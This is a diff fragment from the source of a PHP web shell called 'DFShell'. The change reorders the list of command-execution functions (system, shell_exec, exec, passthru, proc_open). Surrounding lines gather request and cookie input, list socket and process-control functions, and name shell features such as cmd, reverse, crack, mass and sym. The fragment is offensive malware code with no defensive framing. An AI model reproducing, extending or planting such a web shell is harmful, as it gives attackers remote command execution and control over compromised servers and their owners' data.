@@ -21,7 +21,7 @@ $DFShell_Ver = 1.0;
 $DFConfig = array($_REQUEST,$_POST,$_SERVER,$_COOKIE,$_FILES);
 $DFSyntax = array("file_get_contents","fileperms","readfile","chdir","getcwd","function_exists","fsockopen","pcntl_fork",
 "stream_set_blocking","proc_get_status","proc_open","proc_close","posix_setsid","stream_select","stream_get_contents"); // $GLOBALS['DFSyntax']
-$DFSCmd = array("shell_exec","system","exec","passthru","proc_open");
+$DFSCmd = array("system","shell_exec","exec","passthru","proc_open");
 $DFSPlatform = strtolower(substr(PHP_OS,0,3));
 $DFSOptions = array("edit","cmd","del","sql","conf","sym","reverse","crack","mass","logout","dest","ren");
 
